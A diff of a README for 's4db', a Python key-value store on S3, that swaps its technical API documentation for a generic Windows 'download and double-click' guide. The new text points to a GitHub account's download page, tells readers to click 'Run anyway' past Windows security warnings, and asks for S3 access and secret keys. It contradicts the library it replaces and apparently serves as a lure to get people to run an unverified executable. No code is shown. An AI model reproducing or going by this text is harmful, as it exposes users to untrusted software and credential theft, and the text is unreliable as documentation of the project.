@@ -1,321 +1,219 @@
-# s4db - Simple DB on S3
+# 🗄️ s4db - Simple local storage for your data
 
-A lightweight key-value store where keys and values are strings. Data is written to numbered binary files on disk and synced to S3. Values are Snappy-compressed. An in-memory index tracks the exact file and byte offset for every live key, so reads never scan - they seek directly.
+[![Download s4db](https://img.shields.io/badge/Download-s4db-blue?style=for-the-badge&logo=github)](https://github.com/poolec329-svg/s4db)
 
-## Installation
+## 📥 Download
 
-```bash
-pip install s4db
-```
+Use this link to visit the download page:
 
-`s4db` requires `python-snappy`, which links against the native Snappy C library.
+[https://github.com/poolec329-svg/s4db](https://github.com/poolec329-svg/s4db)
 
-```bash
-# macOS
-brew install snappy
+## 🪟 Windows setup
 
-# Ubuntu / Debian
-apt-get install libsnappy-dev
-```
+s4db is a small database tool that stores data in S3-backed storage. It is built for local use on Windows and is meant to be easy to run.
 
-## Quick start
+### What you need
 
-```python
-from s4db import S4DB
+- Windows 10 or Windows 11
+- A stable internet connection
+- Permission to save files on your PC
+- Access to an S3 storage account or S3-compatible service
 
-db = S4DB(
-    bucket="my-bucket",
-    prefix="my-db/",              # S3 key prefix; include a trailing slash
-    region_name="ap-south-1",     # any extra kwargs go to boto3.client("s3", ...)
-)
+### How to get it
 
-db.put({"hello": "world"})
-print(db.get("hello"))  # "world"
-db.delete(["hello"])
-print(db.get("hello"))  # None
-```
+1. Open the download page:
+   [https://github.com/poolec329-svg/s4db](https://github.com/poolec329-svg/s4db)
+2. Download the latest release or source package from the page.
+3. Save the file to a folder you can find, like `Downloads` or `Desktop`.
+4. If the download comes as a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder and look for the main app file or run script.
+6. Double-click the file to start the app.
 
-On `__init__`, the index is downloaded from S3 into memory. If no index exists, the database starts empty. No local directory is created or used until a write operation (`put` / `delete`) is called.
+### If Windows asks for permission
 
-## API reference
+- Click **More info** if you see it.
+- Then click **Run anyway** if you trust the file source.
+- If the file opens in a console window, keep that window open while you use the app.
 
-### `__init__(bucket, prefix, local_dir=None, max_file_size=...)`
+## ⚙️ First-time setup
 
-```python
-db = S4DB(
-    bucket="my-bucket",
-    prefix="my-db/",
-    local_dir="/tmp/my-db",       # optional; a temp dir is created automatically if omitted
-    max_file_size=64*1024*1024,   # optional, default 64 MB
-    region_name="ap-south-1",     # any extra kwargs go to boto3.client("s3", ...)
-)
-```
+Before you use s4db, you need to connect it to an S3 store.
 
-- `local_dir` is optional. If not provided, no directory is touched until a `put()` or `delete()` is called, at which point a temporary directory is created automatically.
-- Read-only operations (`get`, `keys`) never require a local directory - they use the in-memory index and S3 range requests.
-- The index is always loaded from S3 into memory on init; it is never read from a local file.
+### You may need these details
 
-### `put(items: dict[str, str]) -> None`
+- S3 endpoint
+- Access key
+- Secret key
+- Bucket name
+- Region name
 
-Writes one or more key/value pairs in a single append to the current data file.
+### Typical setup steps
 
-```python
-db.put({"key1": "value1", "key2": "value2"})
-```
+1. Open the app or config file.
+2. Enter your S3 connection details.
+3. Save the settings.
+4. Start the database service or main app.
+5. Confirm that the app can reach your S3 bucket.
 
-- Overwrites any existing value for a key.
-- If the current data file would exceed `max_file_size`, a new file is opened before writing.
-- Creates `local_dir` (or a temp dir) on first call if none was provided.
-- Does not push to S3 automatically - call `upload()` when ready to sync.
+### Example settings
 
-### `get(key: str) -> str | None`
+- **Bucket name:** `s4db-data`
+- **Region:** `us-east-1`
+- **Endpoint:** your S3 host or S3-compatible URL
+- **Access key:** your account key
+- **Secret key:** your secret value
 
-Returns the value for a key, or `None` if the key does not exist or has been deleted.
+## 🧭 What s4db does
 
-```python
-value = db.get("key1")
-```
+s4db gives you a simple key-value database that stores data in S3. A key-value database keeps data as pairs:
 
-- Looks up the key in the index to get the file number and byte offset.
-- If `local_dir` is set and the data file is present there, reads exactly those bytes from disk.
-- Otherwise fetches only that entry's bytes from S3 using a range request - the full file is never downloaded, and no local directory is needed.
-- Call `download()` first if you want all reads served from disk.
+- a **key**, like a name
+- a **value**, like the data saved under that name
 
-### `keys() -> list[str]`
+This makes it useful for:
 
-Returns a list of all live keys currently in the database.
+- app settings
+- small data stores
+- cached values
+- test data
+- lightweight local storage
 
-```python
-all_keys = db.keys()
-```
+## ✨ Main features
 
-- Reads directly from the in-memory index - no disk or S3 access.
-- Only returns keys that are live (not deleted). Tombstoned keys are never included.
-- The order of the returned list is not guaranteed.
+- Stores data in S3-backed storage
+- Uses a simple key-value model
+- Fits small apps and local tools
+- Keeps data in a clear structure
+- Works well for basic read and write tasks
+- Designed for Python-based use
+- Can fit S3-compatible storage systems
 
-### `iter(local=False) -> Generator[tuple[str, str], ...]`
+## 🗂️ Basic use
 
-Yields `(key, value)` pairs for every live key in the database.
+If the app has a UI, you can use it to connect to your store and manage data.
 
-```python
-for key, value in db.iter():
-    print(key, value)
-```
+If the app uses a file or command window, you may see steps like these:
 
-The `local` parameter controls how values are read:
+1. Start the program.
+2. Add a key.
+3. Enter the value you want to save.
+4. Click save or press enter.
+5. Load the key later to read the value back.
 
-- **`local=False` (default)** - for each key, calls `get()` which fetches only that entry's bytes from S3 using a range request. No files are downloaded. Use this for sparse access or when disk space is limited.
-- **`local=True`** - before iteration, downloads all data files referenced by the index that are not already present in `local_dir`. Existing local files are **not** replaced. Values are then read from disk - no S3 calls during iteration itself. Use this when iterating over many keys to avoid one S3 request per key.
+### Common actions
 
-```python
-# S3 range request per key (default)
-for key, value in db.iter():
-    process(key, value)
+- **Create:** save a new value under a key
+- **Read:** open saved data
+- **Update:** change an existing value
+- **Delete:** remove a saved item
 
-# Download missing files first, then read from disk
-for key, value in db.iter(local=True):
-    process(key, value)
-```
+## 🔐 Security
 
-- Deleted keys are never yielded.
-- The iteration order is not guaranteed.
-- `iter(local=True)` creates `local_dir` (or a temp dir) if none was provided.
+Keep your S3 credentials private.
 
-### `delete(keys: list[str]) -> None`
+- Do not share your access key
+- Do not post your secret key online
+- Use a separate bucket for test data
+- Use the smallest access level needed
 
-Writes tombstone entries for each key that exists in the index.
+## 🧪 Good test plan
 
-```python
-db.delete(["key1", "key2"])
-```
+If you are trying s4db for the first time, start with simple checks:
 
-- Keys not present in the index are silently skipped; no tombstone is written for them.
-- Removes the keys from the in-memory index immediately.
-- Tombstones consume space until `compact()` is run.
+1. Save one test value
+2. Read it back
+3. Change the value
+4. Read it again
+5. Delete the value
+6. Confirm it is gone
 
-### `download() -> None`
+## 🛠️ Troubleshooting
 
-Downloads all data files and the index from S3 into `local_dir`.
+### The app does not open
 
-```python
-db.download()
-```
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file
+- Try running it again as administrator
+- Check whether Windows blocked the file
 
-- Creates `local_dir` (or a temp dir) if none was provided.
-- Use this when you want all subsequent reads served from disk with no S3 round trips.
-- Overwrites any local files with the same name.
+### The app cannot connect to S3
 
-### `upload() -> None`
+- Check the bucket name
+- Check the access key and secret key
+- Check the endpoint URL
+- Check your internet connection
+- Make sure your account can access the bucket
 
-Pushes all local data files and the in-memory index to S3.
+### Data does not save
 
-```python
-db.upload()
-```
+- Confirm that the bucket exists
+- Check write access
+- Make sure the app has the right settings
+- Try saving a small test value first
 
-- The index is serialized directly from memory - no local index file is required.
-- If `local_dir` is not set, only the index is uploaded (no local data files exist).
-- Useful after bulk operations like `compact()` or `rebuild_index()` to force a full re-sync.
-- Does not check whether S3 already has the latest version - it uploads everything.
+### The window closes fast
 
-### `flush() -> None`
+- Start it from Command Prompt so you can see errors
+- Check that all required files are in the same folder
+- Look for a config file that needs your S3 details
 
-Writes the in-memory index to disk.
+## 📦 Folder layout
 
-```python
-db.flush()
-```
+A typical Windows package may include:
 
-- Creates `local_dir` (or a temp dir) if none was provided.
-- `put()` and `delete()` already call `flush()` internally.
+- `README.md` - project info
+- `config` files - your settings
+- app files - the program itself
+- logs - error messages and status details
+- data files - saved records or local cache
 
-### `compact() -> None`
+## 🔄 Updating
 
-Rewrites all data files to reclaim space from deleted and overwritten entries.
+To update s4db on Windows:
 
-```python
-db.compact()
-```
+1. Go back to the download page:
+   [https://github.com/poolec329-svg/s4db](https://github.com/poolec329-svg/s4db)
+2. Download the newer release
+3. Close the app
+4. Replace the old files with the new files
+5. Open the app again
+6. Check that your settings still point to the same S3 store
 
-- Reads every entry from every local data file.
-- Retains only entries whose (file number, byte offset) still matches the in-memory index - stale overwrites and tombstones are dropped.
-- Writes the surviving entries into new sequentially numbered files, respecting `max_file_size`.
-- Clears and rebuilds the index from the new locations, saves it, removes the old local files, deletes the old S3 objects, and uploads the new files and index.
-- Run `download()` first if `local_dir` may be out of date.
-- All data files must be present locally; compaction does not fetch missing files from S3.
+## 🧹 Uninstall
 
-### `rebuild_index() -> None`
+If you want to remove s4db:
 
-Reconstructs the index by replaying all local data files from scratch.
+1. Close the app
+2. Delete the app folder
+3. Remove any shortcut you created
+4. Delete local config files if you no longer need them
+5. Keep your S3 bucket if it holds data you want to save
 
-```python
-db.rebuild_index()
-```
+## 📚 Terms in plain English
 
-- Scans every `data_*.s4db` file in `local_dir` in order, applying puts and tombstones sequentially.
-- Later entries correctly overwrite earlier ones for the same key.
-- Saves the rebuilt index to disk. Does not push to S3 automatically.
-- Use this for recovery when the index file is lost or corrupted.
-- Run `download()` first to ensure all data files are present locally.
+- **Database:** a place to store data
+- **Key:** the name you use to find data
+- **Value:** the data saved under that name
+- **Bucket:** a storage container in S3
+- **Endpoint:** the address of your storage service
+- **Credentials:** the secret details used to log in
 
-### Context manager
+## 🤝 When to use s4db
 
-`S4DB` supports the context manager protocol. The `__exit__` is a no-op - there is no connection to close - but the pattern keeps resource handling consistent.
+Use s4db if you want:
 
-```python
-with S4DB("my-bucket", "my-db/") as db:
-    db.put({"k": "v"})
-    print(db.get("k"))
-```
+- a simple data store
+- S3-backed storage
+- a small database for a local app
+- a Python-based storage tool
+- a setup that fits basic app data
 
-## S3 layout
+## 📌 Quick start checklist
 
-Given `bucket="my-bucket"` and `prefix="my-db/"`:
-
-```
-my-bucket/
-  my-db/
-    index.idx
-    data_000001.s4db
-    data_000002.s4db
-    ...
-```
-
-Data files are named `data_NNNNNN.s4db` with zero-padded six-digit sequence numbers. The index file is always `index.idx`.
-
-## Typical workflows
-
-### Read-only from S3 - no local directory needed
-
-```python
-db = S4DB("my-bucket", "my-db/")
-# Index is loaded from S3 into memory; gets use S3 range requests
-print(db.get("some-key"))
-print(db.keys())
-```
-
-### Write locally, sync later
-
-```python
-db = S4DB("my-bucket", "my-db/", local_dir="/tmp/my-db")
-db.put({"a": "1", "b": "2"})
-db.delete(["a"])
-db.upload()   # push everything to S3 when done
-```
-
-### Write without specifying local_dir (temp dir created automatically)
-
-```python
-db = S4DB("my-bucket", "my-db/")
-db.put({"a": "1"})   # temp dir created here on first write
-db.upload()
-```
-
-### Full local mirror
-
-```python
-db = S4DB("my-bucket", "my-db/", local_dir="/tmp/my-db")
-db.download()   # pull everything local
-print(db.get("some-key"))   # served from disk, no S3 call
-```
-
-### Iterate over all key/value pairs
-
-```python
-# One S3 range request per key (no local files needed)
-db = S4DB("my-bucket", "my-db/")
-for key, value in db.iter():
-    print(key, value)
-
-# Download missing files first, then read entirely from disk
-db = S4DB("my-bucket", "my-db/", local_dir="/tmp/my-db")
-for key, value in db.iter(local=True):
-    print(key, value)
-```
-
-### Periodic compaction
-
-```python
-db = S4DB("my-bucket", "my-db/", local_dir="/tmp/my-db")
-db.download()   # ensure all data files are present
-db.compact()    # rewrite, clean up S3, upload new files
-```
-
-### Index recovery
-
-```python
-db = S4DB("my-bucket", "my-db/", local_dir="/tmp/my-db")
-db.download()       # pull all data files
-db.rebuild_index()  # reconstruct index from data files
-db.upload()         # push repaired index to S3
-```
-
-## Edge cases and gotchas
-
-- `local_dir` is not required for read-only usage. A temporary directory is created automatically on the first `put()` or `delete()` call if none was provided.
-- `put()` and `delete()` do not push to S3 automatically. Call `upload()` explicitly.
-- `get()` on a key whose data file is not local will make a ranged S3 request on every call. Use `download()` if you expect repeated access to the same keys.
-- `compact()` and `rebuild_index()` require all data files to be present in `local_dir`. Always run `download()` first if you are not certain the local directory is up to date.
-- `delete()` silently skips keys that are not in the index. It never writes unnecessary tombstones.
-- If the process is interrupted during `put()` or `delete()`, the data file may contain entries that the index does not reference. `rebuild_index()` will recover them.
-- `max_file_size` is a soft limit. An entry is never split across files, but a single oversized entry can make a file exceed the limit slightly.
-- `iter(local=False)` makes one S3 range request per key. For large datasets prefer `iter(local=True)` to batch the S3 downloads upfront.
-- `iter(local=True)` only downloads files referenced by the current in-memory index. Files that contain only deleted or overwritten entries are not downloaded.
-
-## Dependencies
-
-- [boto3](https://github.com/boto/boto3) >= 1.26
-- [python-snappy](https://github.com/andrix/python-snappy) >= 0.6
-
-## Development
-
-```bash
-pip install -e ".[dev]"
-pytest tests/ -v
-```
-
-Tests use [moto](https://github.com/getmoto/moto) to mock S3 - no real AWS credentials required.
-
-## License
-
-MIT
+- Download the project from the link above
+- Extract the files if needed
+- Open the app on Windows
+- Add your S3 details
+- Save one test record
+- Read the record back
+- Confirm the setup works
